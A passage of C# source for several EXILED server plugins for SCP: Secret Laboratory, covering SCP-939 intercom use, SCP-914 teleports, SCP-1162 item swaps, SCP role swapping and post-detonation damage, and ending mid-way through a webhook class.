			field?.SetValue(obj, value);
		}
		public static void InvokeInstanceMethod(this object obj, string methodName, object[] param)
		{
			MethodInfo info = obj.GetType().GetMethod(methodName, flags);
			info?.Invoke(obj, param);
		}

		//Generic Extensions
		public static T GetInstanceField<T>(this object obj, string fieldName) => (T)obj?.GetType().GetField(fieldName, flags)?.GetValue(obj);

		public static void SetInstanceField<T>(this object obj, string fieldName, T value)
		{
			FieldInfo field = obj.GetType().GetField(fieldName, flags);
			field?.SetValue(obj, value);
		}

		public static T GetStaticField<T>(this Type type, string fieldName)
		{
			FieldInfo field = type.GetField(fieldName, flags);
			return (T)field?.GetValue(null);
		}

		//Static Extensions
		public static object GetStaticField(this Type type, string fieldName)
		{
			FieldInfo field = type.GetField(fieldName, flags);
			return field?.GetValue(null);
		}
		public static void SetStaticField(this Type type, string fieldName, object value)
		{
			FieldInfo field = type.GetField(fieldName, flags);
			field?.SetValue(null, value);
		}
		public static void InvokeInstanceMethod(this Type type, string methodName, object[] param)
		{
			MethodInfo info = type.GetMethod(methodName, flags);
			info?.Invoke(null, param);
		}
	}
}
namespace MultiPlugin7
{
	public class Plugin : EXILED.Plugin
	{
		public EventHandlers EventHandlers;
		public List<CoroutineHandle> Coroutines = new List<CoroutineHandle>();
		private HarmonyInstance instance;
		public static int InstanceNumber = 0;

		public override void OnEnable()
		{
			EventHandlers = new EventHandlers(this);
			Events.RoundStartEvent += EventHandlers.OnRoundStart;
			InstanceNumber++;
			instance = HarmonyInstance.Create($"scp939-{InstanceNumber}");
			instance.PatchAll();
		}

		public override void OnDisable()
		{
			Events.RoundStartEvent -= EventHandlers.OnRoundStart;
			EventHandlers = null;
			instance.UnpatchAll();
			instance = null;
		}

		public override void OnReload()
		{

		}

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin7
{
	public class EventHandlers
	{
		private Plugin plugin;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;

		private Transform intercomeArea = null;

		private Transform IntercomArea
		{
			get
			{
				if (intercomeArea == null)
					intercomeArea = typeof(Intercom).GetField("area", BindingFlags.NonPublic | BindingFlags.Instance)?.GetValue(Intercom.host) as Transform;

				if (intercomeArea == null)
					throw new MissingFieldException("Field for intercom not found.");
				return intercomeArea;
			}
		}

		public void OnRoundStart()
		{
			intercomeArea = null;
			plugin.Coroutines.Add(Timing.RunCoroutine(CheckFor939Intercom()));
		}

		public IEnumerator<float> CheckFor939Intercom()
		{
			for (; ; )
			{
				yield return Timing.WaitForSeconds(0.1f);

				if (Intercom.host.speaker != null || Intercom.host.speaking)
					continue;

				foreach (ReferenceHub rh in Plugin.GetHubs())
				{
					try
					{
						if (!rh.characterClassManager.CurClass.Is939())
							continue;
						GameObject player = rh.gameObject;
						Intercom intercom = player.GetComponent<Intercom>();
						Scp939PlayerScript script = player.GetComponent<Scp939PlayerScript>();

						if (Vector3.Distance(player.transform.position, IntercomArea.position) >
							intercom.triggerDistance)
						{
							continue;
						}

						if (!script.NetworkusingHumanChat)
						{
							continue;
						}

						Log.Debug("requesting transmition");
						Intercom.host.RequestTransmission(player);
					}
					catch (Exception e)
					{
						while (e != null)
						{
							Log.Error(e.ToString());
							e = e.InnerException;
						}
					}
				}
			}
		}
	}
}
namespace MultiPlugin8
{
	public class Plugin : EXILED.Plugin
	{
		//Instance variable for eventhandlers
		public EventHandlers EventHandlers;

		public List<string> teleportPoints;
		public string settings;
		public float humanDamage;
		public float scpDamage;
		public int damageType;
		public bool debug;

		public override void OnEnable()
		{
			try
			{
				if (!Config.GetBool("mp_enabled", true))
				{
					return;
				}
				Log.Debug("Initializing event handlers..");

				EventHandlers = new EventHandlers(this);

				Events.Scp914UpgradeEvent += EventHandlers.OnScp914Upgrade;

				LoadConfig();

			}
			catch (Exception e)
			{
				Log.Error($"There was an error loading the plugin: {e}");
			}
		}

		public void LoadConfig()
		{
			teleportPoints = Config.GetString($"mp_914escape_teleport_points", "topsite,CROSSING,LC_CAFE,LC_914_CR,HC_079_HALL,HC_079_MON,HC_079_CR,HC_TESLA_B,HC_106_CR,HC_SERVERS,HC_096_CR,nukesite,HC_457_CR,LC_ARMORY,Shelter,Straight_4,Offices_PCs,Offices_upstair,Smallrooms2").ToList();
			settings = Config.GetString("mp_914escape_914_setting", "Coarse");
			humanDamage = Config.GetFloat("mp_914escape_damage_human", 50);
			scpDamage = Config.GetFloat("mp_914escape_damage_scp", 50);
			damageType = Config.GetInt("mp_914escape_damage_type", 0);
		}

		public override void OnDisable()
		{
			Events.Scp914UpgradeEvent -= EventHandlers.OnScp914Upgrade;

			EventHandlers = null;
		}

		public override void OnReload()
		{

		}

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin8
{
	public static class Extensions
	{
		public static void RAMessage(this CommandSender sender, string message, bool success = true) =>
			sender.RaReply("Sample Plugin#" + message, success, true, string.Empty);

		public static void Broadcast(this ReferenceHub rh, ushort time, string message) => rh.GetComponent<Broadcast>().TargetAddElement(rh.scp079PlayerScript.connectionToClient, message, time, 0);

		public static List<string> ToList(this string s)
		{
			if (s == null)

				return null;

			List<string> dict = new List<string>();

			if (!s.Contains(","))

			{

				dict.Add(s);

				return dict;

			}

			string[] tl = s.Split(',');

			foreach (string t in tl)

			{

				dict.Add(t);

			}

			return dict;
		}
	}
}
namespace MultiPlugin8
{
	public class EventHandlers
	{
		public Plugin plugin;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;

		System.Random random = new System.Random();

		public void OnRoundStart()
		{
			foreach (ReferenceHub hub in Plugin.GetHubs())
			{
				Timing.RunCoroutine(GiveBall(hub));
			}
		}

		public IEnumerator<float> GiveBall(ReferenceHub hub)
		{
			yield return Timing.WaitForSeconds(3f);
			for (int i = 0; i < 5; i++)
				hub.inventory.AddNewItem(ItemType.SCP018);
		}

		public void OnScp914Upgrade(ref SCP914UpgradeEvent ev)
		{
			if (ev.KnobSetting != Scp914Knob.Coarse && plugin.teleportPoints.Count >= 1) { return; }
			UnityEngine.GameObject[] rooms = UnityEngine.GameObject.FindGameObjectsWithTag("RoomID");
			foreach (var room in rooms)
			{
			}
			List<ReferenceHub> inputs = ev.Players;
			foreach (ReferenceHub player in inputs)
			{
				if (Plugin.GetTeam(player.characterClassManager.CurClass) != Team.SCP && Plugin.GetTeam(player.characterClassManager.CurClass) != Team.RIP)
				{
					Vector3 _pos;
					string roomToUse = plugin.teleportPoints[random.Next(0, plugin.teleportPoints.Count)];
					foreach (UnityEngine.GameObject room in rooms)
					{
						var pos = room.transform.position;
						var id = room.GetComponent<Rid>().id;
						if (id == roomToUse)
						{
							_pos = new Vector3(pos.x, pos.y + 2, pos.z);
							if (plugin.damageType == 0)
							{
								player.playerStats.Health = (player.playerStats.Health - player.playerStats.Health * (plugin.humanDamage / 100f));
							}
							else
							{
								player.playerStats.Health = (int)(player.playerStats.Health - plugin.humanDamage);
							}
							Timing.RunCoroutine(Teleport(player, _pos));
							break;
						}
					}
				}
				else if (Plugin.GetTeam(player.characterClassManager.CurClass) == Team.SCP && Plugin.GetTeam(player.characterClassManager.CurClass) != Team.RIP)
				{
					Vector3 _pos;
					string roomToUse = plugin.teleportPoints[random.Next(0, plugin.teleportPoints.Count)];
					foreach (UnityEngine.GameObject room in rooms)
					{
						var pos = room.transform.position;
						var id = room.GetComponent<Rid>().id;
						if (id == roomToUse)
						{
							_pos = new Vector3(pos.x, pos.y + 2, pos.z);
							if (plugin.damageType == 0)
							{
								player.playerStats.Health = (player.playerStats.Health - player.playerStats.Health * (plugin.scpDamage / 100f));
							}
							else
							{
								player.playerStats.Health = (int)(player.playerStats.Health - plugin.humanDamage);
							}
							Timing.RunCoroutine(Teleport(player, _pos));
							break;
						}
					}
				}
			}
		}

		private IEnumerator<float> Teleport(ReferenceHub player, Vector3 v)
		{
			yield return Timing.WaitForSeconds(0.1f);

			player.playerMovementSync.OverridePosition(v, player.transform.rotation.y);
		}
	}
}
namespace MultiPlugin9
{
	public class Plugin : EXILED.Plugin
	{
		public EventHandlers EventHandlers;

		public override string getName => "Multi Plugin";
		public string msg1162 = "";


		public override void OnEnable()
		{
			bool isEnabled = Config.GetBool("mp_enable", true);
			if (!isEnabled)
			{
				return;
			}
			else if (isEnabled)
			{
				msg1162 = Config.GetString("mp_scp1162_bc", "<i>You try to drop the item through <color=yellow>SCP-1162</color> to get another item...</i>");
				EventHandlers = new EventHandlers(this);
				Events.ItemDroppedEvent += EventHandlers.OnItemDrop;
			}
		}

		public override void OnDisable()
		{
			Events.ItemDroppedEvent -= EventHandlers.OnItemDrop;
			EventHandlers = null;
		}

		public override void OnReload()
		{
		}
	}
}
namespace MultiPlugin9
{
	public class EventHandlers
	{
		public Plugin Plugin;

		public EventHandlers(Plugin plugin) => Plugin = plugin;
		public void OnItemDrop(ItemDroppedEvent ev)
		{
			Vector3 randomSP = Map.GetRandomSpawnPoint(RoleType.Scp173);
			int range1162 = 8;
			float num = randomSP.x + range1162;
			float num2 = randomSP.y + range1162;
			float num3 = randomSP.z + range1162;
			float num4 = randomSP.x - range1162;
			float num5 = randomSP.y - range1162;
			float num6 = randomSP.z - range1162;
			if (ev.Player.GetPosition().x <= num && ev.Player.GetPosition().x >= num4 && ev.Player.GetPosition().y <= num2 && ev.Player.GetPosition().y >= num5 && ev.Player.GetPosition().z <= num3 && ev.Player.GetPosition().z >= num6)
			{
				ev.Player.ClearBroadcasts();
				ev.Player.Broadcast(5, Plugin.msg1162, true);
				int num7 = new System.Random().Next(1, 86);
				if (num7 >= 1 && num7 <= 4)
				{
					ev.Item.ItemId = ItemType.Coin;
				}
				if (num7 >= 5 && num7 <= 8)
				{
					ev.Item.ItemId = ItemType.Disarmer;
				}
				if (num7 >= 9 && num7 <= 12)
				{
					ev.Item.ItemId = ItemType.GrenadeFlash;
				}
				if (num7 >= 13 && num7 <= 16)
				{
					ev.Item.ItemId = ItemType.Flashlight;
				}
				if (num7 >= 17 && num7 <= 20)
				{
					ev.Item.ItemId = ItemType.Medkit;
				}
				if (num7 >= 21 && num7 <= 24)
				{
					ev.Item.ItemId = ItemType.Radio;
				}
				if (num7 >= 25 && num7 <= 27)
				{
					ev.Item.ItemId = ItemType.KeycardJanitor;
				}
				if (num7 >= 28 && num7 <= 30)
				{
					ev.Item.ItemId = ItemType.KeycardScientist;
				}
				if (num7 >= 31 && num7 <= 33)
				{
					ev.Item.ItemId = ItemType.KeycardSeniorGuard;
				}
				if (num7 >= 34 && num7 <= 36)
				{
					ev.Item.ItemId = ItemType.KeycardZoneManager;
				}
				if (num7 >= 37 && num7 <= 39)
				{
					ev.Item.ItemId = ItemType.KeycardScientistMajor;
				}
				if (num7 >= 40 && num7 <= 42)
				{
					ev.Item.ItemId = ItemType.KeycardGuard;
				}
				if (num7 >= 43 && num7 <= 44)
				{
					ev.Item.ItemId = ItemType.GunCOM15;
				}
				if (num7 >= 45 && num7 <= 46)
				{
					ev.Item.ItemId = ItemType.GunUSP;
				}
				if (num7 >= 47 && num7 <= 48)
				{
					ev.Item.ItemId = ItemType.KeycardNTFLieutenant;
				}
				if (num7 >= 49 && num7 <= 50)
				{
					ev.Item.ItemId = ItemType.GrenadeFrag;
				}
				if (num7 == 51)
				{
					ev.Item.ItemId = ItemType.MicroHID;
				}
				if (num7 == 52)
				{
					ev.Item.ItemId = ItemType.KeycardFacilityManager;
				}
				if (num7 >= 53 && num7 <= 56)
				{
					ev.Item.ItemId = ItemType.Ammo556;
				}
				if (num7 >= 57 && num7 <= 60)
				{
					ev.Item.ItemId = ItemType.Ammo762;
				}
				if (num7 >= 61 && num7 <= 64)
				{
					ev.Item.ItemId = ItemType.Ammo9mm;
				}
				if (num7 == 65)
				{
					ev.Item.ItemId = ItemType.KeycardNTFCommander;
				}
				if (num7 >= 66 && num7 <= 69)
				{
					ev.Item.ItemId = ItemType.WeaponManagerTablet;
				}
				if (num7 >= 70 && num7 <= 72)
				{
					ev.Item.ItemId = ItemType.KeycardContainmentEngineer;
				}
				if (num7 == 73)
				{
					ev.Item.Delete();
					int num8 = new System.Random().Next(0, 12);
					if (num8 == 2)
					{
						num8 = 16;
					}
					if (num8 == 7)
					{
						num8 = 17;
					}
					if (num8 == 11)
					{
						num8 = 15;
					}
					Timing.RunCoroutine(SpawnBodies(ev.Player, num8, 1));
				}
				if (num7 == 74)
				{
					ev.Item.ItemId = ItemType.SCP500;
				}
				if (num7 >= 75 && num7 <= 78)
				{
					ev.Item.ItemId = ItemType.SCP207;
				}
				if (num7 >= 79 && num7 <= 82)
				{
					ev.Item.ItemId = ItemType.Adrenaline;
				}
				if (num7 >= 83 && num7 <= 85)
				{
					ev.Item.ItemId = ItemType.SCP268;
				}
				if (num7 == 86)
				{
					ev.Item.ItemId = ItemType.KeycardO5;
				}
			}
		}
		private IEnumerator<float> SpawnBodies(ReferenceHub player, int role, int count)
		{
			int num;
			for (int i = 0; i < count; i = num + 1)
			{
				player.gameObject.GetComponent<RagdollManager>().SpawnRagdoll(player.gameObject.transform.position + Vector3.up * 5f, Quaternion.identity, player.gameObject.transform.position + Vector3.up * 5f, role, new PlayerStats.HitInfo(1000f, player.characterClassManager.UserId, DamageTypes.Falldown, player.queryProcessor.PlayerId), false, "SCP-343", "SCP-343", 0);
				yield return Timing.WaitForSeconds(0.15f);
				num = i;
			}
			yield break;
		}
	}
}
namespace MultiPlugin10
{
	public class Plugin : EXILED.Plugin
	{
		private EventHandlers ev;

		public override void OnEnable()
		{
			ev = new EventHandlers();
			Events.WaitingForPlayersEvent += ev.OnWaitingForPlayers;
			Events.RoundStartEvent += ev.OnRoundStart;
			Events.RoundEndEvent += ev.OnRoundEnd;
			Events.RoundRestartEvent += ev.OnRoundRestart;
			Events.ConsoleCommandEvent += ev.OnConsoleCommand;
		}

		public override void OnDisable()
		{
			Events.WaitingForPlayersEvent -= ev.OnWaitingForPlayers;
			Events.RoundStartEvent -= ev.OnRoundStart;
			Events.RoundEndEvent -= ev.OnRoundEnd;
			Events.RoundRestartEvent -= ev.OnRoundRestart;
			Events.ConsoleCommandEvent -= ev.OnConsoleCommand;
			ev = null;
		}

		public override void OnReload() { }

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin10
{
	class EventHandlers
	{
		private Dictionary<ReferenceHub, ReferenceHub> ongoingReqs = new Dictionary<ReferenceHub, ReferenceHub>();

		private List<CoroutineHandle> coroutines = new List<CoroutineHandle>();
		private Dictionary<ReferenceHub, CoroutineHandle> reqCoroutines = new Dictionary<ReferenceHub, CoroutineHandle>();

		private bool allowSwaps = false;
		private bool isRoundStarted = false;

		private Dictionary<string, RoleType> valid = new Dictionary<string, RoleType>()
		{
			{"173", RoleType.Scp173},
			{"peanut", RoleType.Scp173},
			{"939", RoleType.Scp93953},
			{"dog", RoleType.Scp93953},
			{"079", RoleType.Scp079},
			{"computer", RoleType.Scp079},
			{"106", RoleType.Scp106},
			{"larry", RoleType.Scp106},
			{"096", RoleType.Scp096},
			{"shyguy", RoleType.Scp096},
			{"049", RoleType.Scp049},
			{"doctor", RoleType.Scp049},
			{"0492", RoleType.Scp0492},
			{"zombie", RoleType.Scp0492}
		};

		private IEnumerator<float> SendRequest(ReferenceHub source, ReferenceHub dest)
		{
			ongoingReqs.Add(source, dest);
			dest.Broadcast(5, Configs.l22, false);
			dest.characterClassManager.TargetConsolePrint(dest.scp079PlayerScript.connectionToClient, Configs.l23.Replace("%player%", $"{source.nicknameSync.Network_myNickSync}").Replace("%player.role%",$"{valid.FirstOrDefault(x => x.Value == source.GetRole()).Key}"), "yellow");
			yield return Timing.WaitForSeconds(Configs.reqTimeout);
			TimeoutRequest(source);
		}

		private void TimeoutRequest(ReferenceHub source)
		{
			if (ongoingReqs.ContainsKey(source))
			{
				ReferenceHub dest = ongoingReqs[source];
				source.characterClassManager.TargetConsolePrint(source.scp079PlayerScript.connectionToClient, Configs.l20, "red");
				dest.characterClassManager.TargetConsolePrint(dest.scp079PlayerScript.connectionToClient, Configs.l21, "red");
				ongoingReqs.Remove(source);
			}
		}

		private void PerformSwap(ReferenceHub source, ReferenceHub dest)
		{
			source.characterClassManager.TargetConsolePrint(source.scp079PlayerScript.connectionToClient, Configs.l1, "green");

			RoleType sRole = source.GetRole();
			RoleType dRole = dest.GetRole();

			Vector3 sPos = source.GetPosition();
			Vector3 dPos = dest.GetPosition();

			float sHealth = source.playerStats.Health;
			float dHealth = dest.playerStats.Health;

			source.SetRole(dRole);
			source.SetPosition(dPos);
			source.playerStats.Health = dHealth;

			dest.SetRole(sRole);
			dest.SetPosition(sPos);
			dest.playerStats.Health = sHealth;

			ongoingReqs.Remove(source);
		}

		public void OnRoundStart()
		{
			allowSwaps = true;
			isRoundStarted = true;
			Timing.CallDelayed(Configs.swapTimeout, () => allowSwaps = false);
		}

		public void OnRoundRestart()
		{
			// fail safe
			isRoundStarted = false;
			Timing.KillCoroutines(coroutines);
			Timing.KillCoroutines(reqCoroutines.Values);
			coroutines.Clear();
			reqCoroutines.Clear();
		}

		public void OnRoundEnd()
		{
			isRoundStarted = false;
			Timing.KillCoroutines(coroutines);
			Timing.KillCoroutines(reqCoroutines.Values);
			coroutines.Clear();
			reqCoroutines.Clear();
		}

		public void OnWaitingForPlayers()
		{
			allowSwaps = false;
			Configs.ReloadConfigs();
		}

		public void OnConsoleCommand(ConsoleCommandEvent ev)
		{
			string cmd = ev.Command.ToLower();
			if (cmd.StartsWith("scpswap"))
			{
				if (isRoundStarted)
				{
					if (ev.Player.GetTeam() == Team.SCP)
					{
						if (allowSwaps)
						{
							string[] args = cmd.Replace("scpswap", "").Trim().Split(' ');
							if (args.Length == 1)
							{
								if (args[0] == "yes")
								{
									ReferenceHub swap = ongoingReqs.FirstOrDefault(x => x.Value == ev.Player).Key;
									if (swap != null)
									{
										PerformSwap(swap, ev.Player);
										ev.ReturnMessage = Configs.l1;
										Timing.KillCoroutines(reqCoroutines[swap]);
										reqCoroutines.Remove(swap);
										ev.Color = "green";
										return;
									}
									else
									{
										ev.ReturnMessage = Configs.l2;
										return;
									}
								}
								else if (args[0] == "no")
								{
									ReferenceHub swap = ongoingReqs.FirstOrDefault(x => x.Value == ev.Player).Key;
									if (swap != null)
									{
										ev.ReturnMessage = Configs.l3;
										swap.characterClassManager.TargetConsolePrint(swap.scp079PlayerScript.connectionToClient, Configs.l4, "red");
										Timing.KillCoroutines(reqCoroutines[swap]);
										reqCoroutines.Remove(swap);
										ongoingReqs.Remove(swap);
										return;
									}
									else
									{
										ev.ReturnMessage = Configs.l5;
										return;
									}
								}
								else if (args[0] == "cancel")
								{
									if (ongoingReqs.ContainsKey(ev.Player))
									{
										ReferenceHub dest = ongoingReqs[ev.Player];
										dest.characterClassManager.TargetConsolePrint(dest.scp079PlayerScript.connectionToClient, Configs.l6, "red");
										Timing.KillCoroutines(reqCoroutines[ev.Player]);
										reqCoroutines.Remove(ev.Player);
										ongoingReqs.Remove(ev.Player);
										ev.ReturnMessage = Configs.l7;
										return;
									}
									else
									{
										ev.ReturnMessage = Configs.l8;
										return;
									}
								}
								else if (valid.ContainsKey(args[0]))
								{
									if (!ongoingReqs.ContainsKey(ev.Player))
									{
										RoleType role = valid[args[0]];
										if (!Configs.blacklist.Contains((int)role))
										{
											if (ev.Player.GetRole() != role)
											{
												ReferenceHub swap = Player.GetHubs().FirstOrDefault(x => role == RoleType.Scp93953 ? x.GetRole() == role || x.GetRole() == RoleType.Scp93989 : x.GetRole() == role);
												if (swap != null)
												{
													reqCoroutines.Add(ev.Player, Timing.RunCoroutine(SendRequest(ev.Player, swap)));
													ev.ReturnMessage = Configs.l9;
													ev.Color = "green";
													return;
												}
												else
												{
													if (Configs.allowNewScps)
													{
														ev.Player.characterClassManager.SetPlayersClass(role, ev.Player.gameObject);
														ev.ReturnMessage = Configs.l10;
														ev.Color = "green";
														return;
													}
													else
													{
														ev.ReturnMessage = Configs.l11;
														return;
													}
												}
											}
											else
											{
												ev.ReturnMessage = Configs.l12;
												return;
											}
										}
										else
										{
											ev.ReturnMessage = Configs.l13;
											return;
										}
									}
									else
									{
										ev.ReturnMessage = Configs.l14;
										return;
									}
								}
								else
								{
									ev.ReturnMessage = Configs.l15;
									return;
								}
							}
							else
							{
								ev.ReturnMessage = Configs.l16;
								return;
							}
						}
						else
						{
							ev.ReturnMessage = Configs.l17;
							return;
						}
					}
					else
					{
						ev.ReturnMessage = Configs.l18;
						return;
					}
				}
				else
				{
					ev.ReturnMessage = Configs.l19;
					return;
				}
			}
		}
	}
}
namespace MultiPlugin10
{
	class Configs
	{
		internal static List<int> blacklist;

		internal static bool allowNewScps;

		internal static float reqTimeout;
		internal static float swapTimeout;
		internal static string l1;
		internal static string l2;
		internal static string l3;
		internal static string l4;
		internal static string l5;
		internal static string l6;
		internal static string l7;
		internal static string l8;
		internal static string l9;
		internal static string l10;
		internal static string l11;
		internal static string l12;
		internal static string l13;
		internal static string l14;
		internal static string l15;
		internal static string l16;
		internal static string l17;
		internal static string l18;
		internal static string l19;
		internal static string l20;
		internal static string l21;
		internal static string l22;
		internal static string l23;

		public static void ReloadConfigs()
		{
			blacklist = Plugin.Config.GetIntList("swap_blacklist");
			if (blacklist == null || blacklist.Count == 0)
			{
				blacklist = new List<int>() { 10 };
			}

			allowNewScps = Plugin.Config.GetBool("mp_swap_allow_new_scps", false);

			swapTimeout = Plugin.Config.GetFloat("mp_swap_timeout", 60f);
			reqTimeout = Plugin.Config.GetFloat("mp_swap_request_timeout", 20f);
			l1 = Plugin.Config.GetString("mp_swap_language_1", "Swap successful!");
			l2 = Plugin.Config.GetString("mp_swap_language_2", "You do not have a swap request.");
			l3 = Plugin.Config.GetString("mp_swap_language_3", "Swap request denied.");
			l4 = Plugin.Config.GetString("mp_swap_language_4", "Your swap request has been denied.");
			l5 = Plugin.Config.GetString("mp_swap_language_5", "You do not have a swap reqest.");
			l6 = Plugin.Config.GetString("mp_swap_language_6", "Your swap request has been cancelled.");
			l7 = Plugin.Config.GetString("mp_swap_language_7", "You have cancelled your swap request.");
			l8 = Plugin.Config.GetString("mp_swap_language_8", "You do not have an outgoing swap request.");
			l9 = Plugin.Config.GetString("mp_swap_language_9", "Swap request sent!");
			l10 = Plugin.Config.GetString("mp_swap_language_10", "Could not find a player to swap with, you have been made the specified SCP.");
			l11 = Plugin.Config.GetString("mp_swap_language_11", "No players found to swap with.");
			l12 = Plugin.Config.GetString("mp_swap_language_12", "You cannot swap with your own role.");
			l13 = Plugin.Config.GetString("mp_swap_language_13", "That SCP is blacklisted.");
			l14 = Plugin.Config.GetString("mp_swap_language_14", "You already have a request pending!");
			l15 = Plugin.Config.GetString("mp_swap_language_15", "Invalid SCP.");
			l16 = Plugin.Config.GetString("mp_swap_language_16", "USAGE: SCPSWAP [SCP NUMBER]");
			l17 = Plugin.Config.GetString("mp_swap_language_17", "SCP swap period has expired.");
			l18 = Plugin.Config.GetString("mp_swap_language_18", "You're not an SCP, why did you think that would work.");
			l19 = Plugin.Config.GetString("mp_swap_language_19", "The round hasn't started yet!");
			l20 = Plugin.Config.GetString("mp_swap_language_20", "The player did not respond to your request.");
			l21 = Plugin.Config.GetString("mp_swap_language_21", "Your swap request has timed out.");
			l22 = Plugin.Config.GetString("mp_swap_language_22", "<i>You have an SCP Swap request!\nCheck your console by pressing [`] or [~]</i>");
			l23 = Plugin.Config.GetString("mp_swap_language_23", "You have received a swap request from %player% who is SCP-%player.role%. Would you like to swap with them? Type \".scpswap yes\" to accept or \".scpswap no\" to decline.");
		}
	}
}
namespace MultiPlugin11
{
	public class EventHandlers
	{
		public Plugin plugin;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;

		internal void OnConsoleCommand(ConsoleCommandEvent ev)
		{
			if (ev.Player.GetTeam() == Team.SCP && ev.Command.ToLower() == "scplist")
			{
				IEnumerable<ReferenceHub> SCPs = Player.GetHubs().Where(rh => rh.GetTeam() == Team.SCP);

				string response = "";

				foreach (ReferenceHub scp in SCPs)
				{
					response += $"\n{scp.GetNickname()} - {scp.characterClassManager.Classes.SafeGet(scp.GetRole()).fullName}";
				}

				ev.ReturnMessage = response;
				ev.Color = "cyan";
			}
		}

		internal void OnRoundStart()
		{
			if (!plugin.displayBroadcast) return;

			IEnumerable<ReferenceHub> SCPs = Player.GetHubs().Where(rh => rh.GetTeam() == Team.SCP);

			if (!SCPs.Any()) return;

			List<string> response = new List<string>();

			foreach (ReferenceHub scp in SCPs)
			{
				response.Add($"{scp.GetNickname()} - {scp.characterClassManager.Classes.SafeGet(scp.GetRole()).fullName}");
			}

			string msg = string.Join(" | ", response);

			foreach (ReferenceHub scp in SCPs)
			{
				scp.Broadcast(5, msg);
			}
		}
	}
}
namespace MultiPlugin11
{
	public static class Extensions
	{
		//These are two commonly used extensions that will make your life considerably easier
		//When sending RaReply's, you need to identify the 'source' of the message with a string followed by '#' at the start of the message, otherwise the message will not be sent
		public static void RAMessage(this CommandSender sender, string message, bool success = true) =>
			sender.RaReply("SCPList#" + message, success, true, string.Empty);

		public static void Broadcast(this ReferenceHub rh, ushort time, string message) => rh.GetComponent<Broadcast>().TargetAddElement(rh.scp079PlayerScript.connectionToClient, message, time, 0);
	}
}
namespace MultiPlugin11
{
	public class Plugin : EXILED.Plugin
	{
		//Instance variable for eventhandlers
		public EventHandlers EventHandlers;

		public bool displayBroadcast;

		public override void OnEnable()
		{
			if (!Config.GetBool("mp_enable", true))
			{
				return;
			}

			displayBroadcast = Config.GetBool("mp_scplist_broadcast", false);

			try
			{
				Log.Debug("Initializing event handlers..");
				EventHandlers = new EventHandlers(this);
				Events.ConsoleCommandEvent += EventHandlers.OnConsoleCommand;
				Events.RoundStartEvent += EventHandlers.OnRoundStart;
				Log.Info($"SCPList loaded.");
			}
			catch (Exception e)
			{
				Log.Error($"There was an error loading the plugin: {e}");
			}
		}

		public override void OnDisable()
		{
			Events.ConsoleCommandEvent -= EventHandlers.OnConsoleCommand;
			Events.RoundStartEvent -= EventHandlers.OnRoundStart;

			EventHandlers = null;
		}

		public override void OnReload()
		{}

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin12
{
	public class SurfaceTension : Plugin
	{
		public EventHandlers EventHandlers { get; private set; }
		public Methods Methods { get; private set; }

		public bool Enabled;
		public bool DoDelay;
		public bool IsPercentage;
		public int Damage;
		public float DelayTime;
		public float TimeBetweenDamage;

		public override void OnEnable()
		{
			ReloadConfig();

			if (!Enabled)
				return;

			EventHandlers = new EventHandlers(this);
			Methods = new Methods(this);

			Events.RoundStartEvent += EventHandlers.OnRoundStart;
			Events.RoundEndEvent += EventHandlers.OnRoundEnd;
			Events.WarheadDetonationEvent += EventHandlers.OnWarheadDetonation;
		}
		public override void OnDisable()
		{
			foreach (CoroutineHandle handle in EventHandlers.Coroutines)
			{
				Timing.KillCoroutines(handle);
			}

			Events.RoundStartEvent -= EventHandlers.OnRoundStart;
			Events.RoundEndEvent -= EventHandlers.OnRoundEnd;
			Events.WarheadDetonationEvent -= EventHandlers.OnWarheadDetonation;
			EventHandlers = null;
			Methods = null;
		}

		public override void OnReload()
		{

		}

		public override string getName { get; } = "Multi Plugin";

		private void ReloadConfig()
		{
			Enabled = Config.GetBool("mp_enable", true);
			DoDelay = Config.GetBool("mp_alpha_enable_delay", true);
			IsPercentage = Config.GetBool("mp_alpha_is_damage_type_percent", true);
			Damage = Config.GetInt("mp_alpha_damage", 1);
			DelayTime = Config.GetFloat("mp_alpha_delay_time", 90f);
			TimeBetweenDamage = Config.GetFloat("mp_alpha_time_between_dmg", 1f);
			Log.Info("Configs Reloaded");
		}
	}
}
namespace MultiPlugin12
{
	public class Methods
	{
		private readonly SurfaceTension plugin;
		public Methods(SurfaceTension plugin) => this.plugin = plugin;

		public static float DamageCalculation(bool isPercent, int playerMaxHp, int damage)
		{
			if (isPercent)
				return (playerMaxHp / 100) * damage;
			return damage;
		}

		public IEnumerator<float> RaiseTheTension()
		{
			Log.Info("Raising the tension");

			if (plugin.DoDelay)
			{
				yield return Timing.WaitForSeconds(plugin.DelayTime);
			}

			Log.Info("Delay finished, starting to damage players.");

			for (; ; )
			{
				yield return Timing.WaitForSeconds(plugin.TimeBetweenDamage);

				foreach (ReferenceHub hub in Player.GetHubs())
				{
					if (hub.characterClassManager.CurClass == RoleType.Spectator)
						continue;

					int maxHp = hub.playerStats.maxHP;
					var postNukeDamage = DamageCalculation(plugin.IsPercentage, maxHp, plugin.Damage);

					hub.playerStats.HurtPlayer(new PlayerStats.HitInfo(postNukeDamage, "POST-DETONATION-DAMAGE", DamageTypes.Wall, 0), hub.gameObject);
				}
			}
		}
	}
}
namespace MultiPlugin12
{
	public class EventHandlers
	{
		private readonly SurfaceTension plugin;
		public EventHandlers(SurfaceTension plugin)
		{
			this.plugin = plugin;
		}

		public List<CoroutineHandle> Coroutines = new List<CoroutineHandle>();

		public void OnRoundStart()
		{
			foreach (CoroutineHandle handle in Coroutines)
				Timing.KillCoroutines(handle);
		}

		public void OnWarheadDetonation()
		{
			Log.Info("Warhead has been detonated.");
			Coroutines.Add(Timing.RunCoroutine(plugin.Methods.RaiseTheTension()));
			Log.Info("Tension Raised.");
		}

		public void OnRoundEnd()
		{
			foreach (CoroutineHandle handle in Coroutines)
				Timing.KillCoroutines(handle);
		}
	}
}
namespace MultiPlugin13
{
	[JsonObject]
	public class Webhook
	{
		private readonly HttpClient _httpClient;
		private readonly string _webhookUrl;

		[JsonProperty("content")]
		public string Content { get; set; }
		[JsonProperty("username")]
		public string Username { get; set; }
		[JsonProperty("avatar_url")]
		public string AvatarUrl { get; set; }
		// ReSharper disable once InconsistentNaming
		[JsonProperty("tts")]
		public bool IsTTS { get; set; }
		[JsonProperty("embeds")]
		public List<Embed> Embeds { get; set; } = new List<Embed>();

